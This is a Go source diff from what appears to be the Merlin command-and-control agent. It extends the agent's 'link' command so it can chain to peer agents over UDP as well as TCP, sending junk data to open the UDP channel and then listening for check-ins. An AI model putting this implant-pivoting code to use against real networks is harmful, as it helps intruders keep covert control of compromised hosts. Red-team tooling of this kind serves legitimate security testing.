@@ -23,6 +23,7 @@ import (
 	"bytes"
 	"encoding/gob"
 	"fmt"
+	"math/rand"
 	"net"
 	"strings"
 	"time"
@@ -33,6 +34,7 @@ import (
 
 	// Internal
 	"github.com/Ne0nd0g/merlin-agent/cli"
+	"github.com/Ne0nd0g/merlin-agent/core"
 	"github.com/Ne0nd0g/merlin-agent/p2p"
 )
 
@@ -47,7 +49,9 @@ func Link(cmd jobs.Command) (results jobs.Results) {
 	// switch on first argument
 	switch strings.ToLower(cmd.Args[0]) {
 	case "tcp":
-		return TCPConnect(cmd.Args[1:])
+		return Connect("tcp", cmd.Args[1:])
+	case "udp":
+		return Connect("udp", cmd.Args[1:])
 	default:
 		return jobs.Results{
 			Stderr: fmt.Sprintf("Unhandled link type: %s", cmd.Args[0]),
@@ -55,12 +59,19 @@ func Link(cmd jobs.Command) (results jobs.Results) {
 	}
 }
 
-// TCPConnect establishes a TCP connection to a tcp-bind peer-to-peer Agent
-func TCPConnect(args []string) (results jobs.Results) {
+// Connect establishes a TCP or UDP connection to a tcp-bind or udp-bind peer-to-peer Agent
+func Connect(network string, args []string) (results jobs.Results) {
+	cli.Message(cli.DEBUG, fmt.Sprintf("commands/link.Connect(): entering into function with network: %s, args: %+v", network, args))
 	linkedAgent := p2p.Agent{
-		In:   make(chan messages.Base, 100),
-		Out:  make(chan messages.Base, 100),
-		Type: p2p.TCPBIND,
+		In:  make(chan messages.Base, 100),
+		Out: make(chan messages.Base, 100),
+	}
+
+	switch strings.ToLower(network) {
+	case "tcp":
+		linkedAgent.Type = p2p.TCPBIND
+	case "udp":
+		linkedAgent.Type = p2p.UDPBIND
 	}
 
 	// args[0] = target (e.g., 192.168.1.10:8080)
@@ -70,17 +81,31 @@ func TCPConnect(args []string) (results jobs.Results) {
 	}
 
 	// Establish connection to downstream agent
-	conn, err := net.Dial("tcp", args[0])
+	conn, err := net.Dial(network, args[0])
 	if err != nil {
 		results.Stderr = fmt.Sprintf("there was an error attempting to link the agent: %s", err.Error())
 		return
 	}
 
 	linkedAgent.Conn = conn
+	var n int
 
-	// Wait for linked agent first checking message
+	// We must first write data to the UDP connection to let the UDP bind Agent know we're listening and ready
+	if linkedAgent.Type == p2p.UDPBIND {
+		junk := core.RandStringBytesMaskImprSrc(rand.Intn(100))
+		cli.Message(cli.NOTE, fmt.Sprintf("Initiating UDP connection to %s sending junk data: %s", linkedAgent.Conn.(net.Conn).RemoteAddr(), junk))
+		n, err = linkedAgent.Conn.(net.Conn).Write([]byte(junk))
+		cli.Message(cli.NOTE, fmt.Sprintf("Wrote %d bytes to UDP connection", n))
+		if err != nil {
+			results.Stderr = fmt.Sprintf("there was an error writing data to the UDP connection: %s", err)
+			return
+		}
+		// Wait for linked agent first checking message
+		cli.Message(cli.NOTE, fmt.Sprintf("Waiting to recieve UDP connection from %s...", linkedAgent.Conn.(net.Conn).RemoteAddr()))
+	}
+
 	data := make([]byte, 50000)
-	n, err := bufio.NewReader(linkedAgent.Conn).Read(data)
+	n, err = bufio.NewReader(linkedAgent.Conn.(net.Conn)).Read(data)
 	if err != nil {
 		cli.Message(cli.WARN, fmt.Sprintf("there was an error reading datat from linked agent %s: %s", args[0], err))
 	}
@@ -105,6 +130,6 @@ func TCPConnect(args []string) (results jobs.Results) {
 	results.Stdout = fmt.Sprintf("Successfully connected to %s at %s", msg.Agent, args[0])
 
 	// The listen function is in commands/listen.go
-	go listen(linkedAgent.Conn)
+	go listen(linkedAgent.Conn.(net.Conn))
 	return
 }
